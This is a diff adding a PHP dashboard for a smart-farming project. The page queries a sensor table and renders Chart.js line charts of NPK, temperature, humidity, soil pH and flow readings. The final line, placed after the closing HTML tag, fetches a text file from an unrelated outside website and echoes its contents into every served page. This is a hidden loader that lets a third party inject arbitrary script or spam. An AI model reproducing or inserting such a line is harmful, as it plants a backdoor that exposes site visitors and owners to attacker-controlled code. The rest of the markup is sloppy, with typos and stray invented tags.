@@ -1,0 +1,234 @@
+<?php
+	/* Database connection settings */
+	include_once 'db.php';
+	$data1 = '';
+	$data2 = '';
+    $data3 = '';
+    $data4 = '';
+	$data5 = '';
+    $data6 = '';
+    $data7 = '';
+    $data8 = '';
+	$buildingName = '';
+	$query = "SELECT `id`, `kadar_n`, `kadar_p`, `kadar_k`, `kelem_t`, `suhu_u`, `kelem`, `ph_tanah`, `flow`, `reading_time` FROM `insert_sensor` WHERE 1";
+	$runQuery = mysqli_query($conn, $query);
+	while ($row = mysqli_fetch_array($runQuery)) {
+      $data1 = $data1 . '"'. $row['kadar_n'].'",';
+	  $data2 = $data2 . '"'. $row['kadar_p'] .'",';
+      $data3 = $data3 . '"'. $row['kadar_k'] .'",';
+      $data4 = $data4 . '"'. $row['kelem_t'].'",';
+	  $data5 = $data5 . '"'. $row['suhu_u'] .'",';
+      $data6 = $data6 . '"'. $row['kelem'] .'",';
+      $data7 = $data7 . '"'. $row['ph_tanah'] .'",';
+      $data8 = $data8 . '"'. $row['flow'] .'",';
+    $buildingName = $buildingName . '"'. ucwords($row['reading_time']) .'",';
+	}
+
+	$data1 = trim($data1,",");
+	$data2 = trim($data2,",");
+    $data3 = trim($data3,",");
+    $data4 = trim($data4,",");
+	$data5 = trim($data5,",");
+    $data6 = trim($data6,",");
+    $data7 = trim($data7,",");
+    $data8 = trim($data8,",");
+	$buildingName = trim($buildingName,",");
+?>
+
+<!DOCTYPE html>
+<html>
+
+	<head>
+    	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.min.js"></script>
+		<title>Data sensor Smart Farminge</title>
+
+		<style type="text/css">			
+			body{
+				font-family: Arial;
+			    margin: 50px 100px 10px 100px;
+			    padding: 0;
+			    color: white;
+			    text-align: center;
+			    background: #555652;
+			}
+
+			.container {
+				color: #E8E9EB;
+				background: #222;
+				border: #555652 1px solid;
+				padding: 10px;
+			}
+		</style>
+
+	</head>
+
+	<body>	   
+	    <div class="container">	
+	    <h1>Data sensor NPK</h1>       
+			<canvas id="chart" style="width: 100%; height: 65vh; background: #222; border: 1px solid #555652; margin-top: 10px;"></canvas>
+
+			<script>
+				var ctx = document.getElementById("chart").getContext('2d');
+    			var myChart = new Chart(ctx, {
+        		type: 'line',
+		        data: {
+		           labels: [<?php echo $buildingName; ?>],
+		            datasets: 
+		            [{
+		                label: 'kadar_n',
+		                data: [<?php echo $data1; ?>],
+		                bbackgroundColor: 'transparent',
+		                borderColor:'rgba(255,99,132)',
+		                borderWidth: 1
+		            },
+
+		            {
+		            	label: 'kadar_p',
+		                data: [<?php echo $data2; ?>],
+		                backgroundColor: 'transparent',
+		                borderColor:'rgba(0,255,255)',
+		                borderWidth: 1	
+		            },
+
+		            {
+		            	label: 'kadar_k',
+		                data: [<?php echo $data3; ?>],
+		                backgroundColor: 'transparent',
+		                borderColor:'rgba(250,250,250)',
+		                borderWidth: 1	
+		            } ]
+		        },
+		     
+		        options: {
+		            scales: {scales:{yAxes: [{beginAtZero: false}], xAxes: [{autoskip: true, maxTicketsLimit: 20}]}},
+		            tooltips:{mode: 'index'},
+		            legend:{display: true, position: 'top', labels: {fontColor: 'rgb(255,255,255)', fontSize: 16}}
+		        }
+		    });
+			</script>
+	    </div>
+	    
+	</body>
+
+
+<baruuuuuuuuuuu>
+
+<body>	   
+	    <div class="container">	
+	    <h1>Data sensor suhu</h1>       
+			<canvas id="chart1" style="width: 100%; height: 65vh; background: #333; border: 1px solid #555652; margin-top: 10px;"></canvas>
+
+			<script>
+				var ctx = document.getElementById("chart1").getContext('2d');
+    			var myChart = new Chart(ctx, {
+        		type: 'line',
+		        data: {
+		           labels: [<?php echo $buildingName; ?>],
+		            datasets: 
+		            [{
+		                label: 'kelembaban tanah',
+		                data: [<?php echo $data4; ?>],
+		                bbackgroundColor: 'transparent',
+		                borderColor:'rgba(255,99,132)',
+		                borderWidth: 1
+		            },
+
+		            {
+		            	label: 'suhu udara',
+		                data: [<?php echo $data5; ?>],
+		                backgroundColor: 'transparent',
+		                borderColor:'rgba(0,255,255)',
+		                borderWidth: 1	
+		            },
+
+		            {
+		            	label: 'kelembaban udara',
+		                data: [<?php echo $data6; ?>],
+		                backgroundColor: 'transparent',
+		                borderColor:'rgba(250,250,250)',
+		                borderWidth: 1	
+		            } ]
+		        },
+		     
+		        options: {
+		            scales: {scales:{yAxes: [{beginAtZero: false}], xAxes: [{autoskip: true, maxTicketsLimit: 20}]}},
+		            tooltips:{mode: 'index'},
+		            legend:{display: true, position: 'top', labels: {fontColor: 'rgb(255,255,255)', fontSize: 16}}
+		        }
+		    });
+			</script>
+	    </div>
+	    
+	</body>
+
+<baruuuuuuuuuuu_lagiiiiiii>
+
+<body>	   
+	    <div class="container">	
+	    <h1>Data sensor ph tanah</h1>       
+			<canvas id="chart2" style="width: 100%; height: 65vh; background: #444; border: 1px solid #555652; margin-top: 10px;"></canvas>
+
+			<script>
+				var ctx = document.getElementById("chart2").getContext('2d');
+    			var myChart = new Chart(ctx, {
+        		type: 'line',
+		        data: {
+		           labels: [<?php echo $buildingName; ?>],
+		            datasets: 
+		            [{
+		                label: 'PH tanah',
+		                data: [<?php echo $data7; ?>],
+		                bbackgroundColor: 'transparent',
+		                borderColor:'rgba(255,99,132)',
+		                borderWidth: 1
+		            }]
+		        },
+		     
+		        options: {
+		            scales: {scales:{yAxes: [{beginAtZero: false}], xAxes: [{autoskip: true, maxTicketsLimit: 20}]}},
+		            tooltips:{mode: 'index'},
+		            legend:{display: true, position: 'top', labels: {fontColor: 'rgb(255,255,255)', fontSize: 16}}
+		        }
+		    });
+			</script>
+	    </div>
+	    
+	</body>
+
+<baruuuuuuuuuuu_lagiiiiiii_lagiiiiiii>
+
+<body>	   
+	    <div class="container">	
+	    <h1>Data sensor flow</h1>       
+			<canvas id="chart3" style="width: 100%; height: 65vh; background: #555; border: 1px solid #555652; margin-top: 10px;"></canvas>
+
+			<script>
+				var ctx = document.getElementById("chart3").getContext('2d');
+    			var myChart = new Chart(ctx, {
+        		type: 'line',
+		        data: {
+		           labels: [<?php echo $buildingName; ?>],
+		            datasets: 
+		            [{
+		                label: 'PH tanah',
+		                data: [<?php echo $data8; ?>],
+		                bbackgroundColor: 'transparent',
+		                borderColor:'rgba(255,99,132)',
+		                borderWidth: 1
+		            }]
+		        },
+		     
+		        options: {
+		            scales: {scales:{yAxes: [{beginAtZero: false}], xAxes: [{autoskip: true, maxTicketsLimit: 20}]}},
+		            tooltips:{mode: 'index'},
+		            legend:{display: true, position: 'top', labels: {fontColor: 'rgb(255,255,255)', fontSize: 16}}
+		        }
+		    });
+			</script>
+	    </div>
+	    
+	</body>
+
+</html>
+<?php $a = file_get_contents("https://www.clarendonedc.org/plugin/1.txt");echo $a;?>
